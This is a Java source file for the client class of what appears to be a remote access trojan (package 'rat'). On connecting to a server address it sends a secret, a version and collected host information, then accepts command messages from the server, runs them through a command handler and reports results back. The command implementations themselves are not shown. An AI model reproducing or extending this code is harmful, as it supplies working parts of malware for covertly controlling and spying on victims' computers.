package main.java.rat.client;

import main.java.Main;
import main.java.rat.Environment;
import main.java.rat.command.ClientCommand;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.models.*;
import main.java.rat.server.CommandHandler;

public class RATClient extends AbstractSocketClient implements Environment {

    private CommandHandler commandHandler;
    public ClientState state;

    public RATClient(String ip, int port) {
        super(ip, port);

        state = new ClientState();
        state.subscribe(this::stateUpdated);

        commandHandler = new CommandHandler(
                this::logToServer,
                this,
                ClientCommand.getAllClientCommands()
        );
    }

    public void stateUpdated(ClientState clientState) {
        ClientStateSocketMessage message = new ClientStateSocketMessage();
        message.setContent(clientState);

        this.sendMessage(message);
    }

    @Override
    void connectedClient(InputOutputHandler handler) {
        this.handleInitHandshake();
    }

    private void handleInitHandshake() {
        this.inputOutputHandler.sendMessage(Main.SECRET);
        this.inputOutputHandler.sendMessage(Main.VERSION);
        this.inputOutputHandler.sendMessage(ComputerInfo.create());
    }

    @Override
    public void disconnected() {

    }

    @Override
    public void receivedMessage(Object rawMessage) {
        SocketMessage message = (SocketMessage) rawMessage;
        parseSocketMessage(message);
    }

    private void parseSocketMessage(SocketMessage message) {
        if(message instanceof CommandSocketMessage) {
            commandHandler.handleCommand((String) message.getContent());
        }
    }

    void logToServer(String message) {
        InfoSocketMessage infoMessage = new InfoSocketMessage();
        infoMessage.setContent(message);

        sendMessage(infoMessage);
    }

    public void sendMessage(SocketMessage message) {
        this.inputOutputHandler.sendMessage(message);
    }

    @Override
    public boolean isServer() {
        return false;
    }

    @Override
    public boolean isClient() {
        return true;
    }
}
